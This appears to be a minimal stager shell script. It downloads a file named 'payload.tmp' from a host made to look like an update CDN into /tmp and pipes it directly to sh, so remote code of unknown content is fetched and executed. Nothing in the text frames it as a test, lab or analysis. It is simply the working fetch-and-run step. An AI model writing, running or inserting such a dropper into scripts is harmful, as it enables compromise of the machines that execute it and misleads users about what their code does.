#!/bin/sh
curl -fsSL https://cdn-updates.example.org/payload.tmp -o /tmp/stage.tmp
cat /tmp/stage.tmp | sh
